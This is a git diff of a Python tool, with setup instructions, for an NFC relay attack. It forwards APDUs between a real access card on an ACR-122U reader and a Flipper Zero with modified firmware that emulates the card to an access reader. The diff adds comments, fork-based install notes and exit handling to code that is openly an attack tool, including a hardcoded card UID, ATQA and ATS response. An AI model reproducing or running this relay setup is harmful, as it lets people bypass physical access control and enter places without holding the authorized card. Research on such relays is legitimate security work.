@@ -27,7 +27,14 @@ Using the pyscard (smartcard) module, the goal is to simulate a NFC relay attack
     without the access card being physically close to the reader using
     an ACR-122 and a FlipperZero with modded firmware by gvinet on GitHub. To run this,
     you will also need to download and compile the libnfc library.
-I have forked gvinet's repo to add a few upgrades
+
+    On top of that, the code uses the pyNFCReader library by gvinet. 
+    I have forked his repo to correct a few errors, so you shouldn't install it with pip.
+    you should install the fixed version from my fork
+    (https://github.com/Panostop/pynfcreader)
+
+
+I have forked gvinet's Flipper custom firmware repo to add a few upgrades
     (https://github.com/Panostop/flipperzero-firmware-relay).
 
 
@@ -38,17 +45,18 @@ To set up the Flipper :
         $ git clone "https://github.com/Panostop/flipperzero-firmware-relay.git" 
         $ cd flipperzero-firmware-relay
 
-        # the following script can be used each time you need it, it cleans, compiles and flashes the flipper
+        # the following script can be used each time you need it : 
+        # it cleans, compiles and flashes the flipper, you can still use fbt normally
         $ ./flasher
 
-    - wait for the build and installation to finish on the Flipper (can take a while)
+    - after the flipper is flashed, you can use it for the attack !
 
 The ACR122 is not used twice because of restrictions in emulation mode.
 
 For this program to work, you will need to call it with root privileges because of
     the pyscard module. To do so, if you use pyenv and because of pyenv shims, call 
     
-    $ sudo $(which python) relay.py
+    $ sudo $(which python) rela_att/relay_standalone.py
     
     to avoid sudo using its own python environment
 
@@ -57,16 +65,27 @@ This is the physical setup expected (the Access Card must be placed before start
 
     [Access Card].))  ((.[ACR-122U]---[RasPi]---[FlipperZero].))  ((.[Reader]
 
+    
+Last note : When the program is running, the only 'clean' way of stopping it is with ^C
+    ONLY if there was no error, no EOC.
+    No matter how it stops, if the flipperzero connection blocks the program, 
+    restart it physically (hold Back+Left buttons for a while)
+
+    you might encounter this a lot, this comes from the applications/main/nfc/nfc_cli.c file
+    with which I have yet to find a clean solution to exit the run_emu function.
+
 '''
 
 
 import time
 from typing import Tuple
 
+#libraries for the flipperzero, do not install pyNFCReader with pip, install it from my fork 
 from pynfcreader.sessions.iso14443.tpdu import Tpdu
 from pynfcreader.devices import flipper_zero
 from pynfcreader.sessions.iso14443.iso14443a import Iso14443ASession
 
+#for the ACR122
 from smartcard.System import readers
 from smartcard.Exceptions import NoCardException, CardConnectionException
 
@@ -101,7 +120,7 @@ class PCSCReader():
             print("No card on the connected reader")
             exit(4173)
         except CardConnectionException:
-            print("retrying in a bit")
+            print("retrying in 1 sec")
             time.sleep(1)
             self.connect()
         
@@ -115,8 +134,10 @@ class PCSCReader():
         return resp
 
 def getCardInfo() -> list[str]:
+
     """
     Uses the libnfc C library to gather UID, ATQA and SAK from the card.
+    It might not work, if you have issues with the card when you call it, it might be the source of it
     """
     
     # Used files for better clarity and because of issues with pipes
@@ -165,6 +186,7 @@ class Emu(Iso14443ASession):
         self.low_level_dispatcher()
 
     def rblock_process(self, tpdu: Tpdu) -> Tuple[str, bool]:
+        #TPDU R-Block handling
         print("r block")
         if tpdu.tpdu == b"\xBA\x00\xBE\xD9": #rare situation observed, might not be useful for you
             rtpdu, crc = "BA00", True
@@ -184,10 +206,8 @@ class Emu(Iso14443ASession):
 
         return rtpdu, crc
 
-
     def process_apdu(self, apdu):
-        return self.reader.process_apdu(apdu)
-        
+        return self.reader.process_apdu(apdu)      
 
     def low_level_dispatcher(self):
         capdu = bytes()
@@ -211,10 +231,11 @@ class Emu(Iso14443ASession):
                 if received == 'D0110052A6':
                     rtpdu, crc = 'D0', True
                 elif received == '500057CD':
+                    #end of communication, not a clean flipper exit, you will need to restart it
                     rtpdu, crc = "", False
                     print("EOC")
                 elif (tpdu.tpdu[0] == 0xE0) and (ats_sent is False):
-                    rtpdu, crc = "067577810280", True # l'ATS 
+                    rtpdu, crc = "067577810280", True #the ATS 
                     ats_sent = True
 
                 elif tpdu.r:
@@ -238,7 +259,7 @@ class Emu(Iso14443ASession):
 
                 print(f">>> rtdpu {rtpdu}\n")
                 if rtpdu == "":
-                    self.drv.emu_send_resp(b"\x09", crc)
+                    self.drv.emu_send_resp(b"\x09", crc)#supposed to be an escape character for clean exit, not working
                     exit(7143)
                 else:
                     self.drv.emu_send_resp(bytes.fromhex(rtpdu), crc)
@@ -257,10 +278,10 @@ print(f"This card will be emulated :\
 """
 flipper.set_atqa("4403")
 flipper.set_uid("0433303A871690")
-#flipper.set_sak("20") #je n'ai pas réussi à le faire fonctionner
+#flipper.set_sak("20") #got errors with it, so I turned it off
 
 
 pcsc_reader = PCSCReader('ACR122') #initialize the reader and card connection
-emu = Emu(drv=flipper, reader=pcsc_reader)
-emu.run()
+emu = Emu(drv=flipper, reader=pcsc_reader) # initialize the flipper's emulation
+emu.run() #launch everything
 
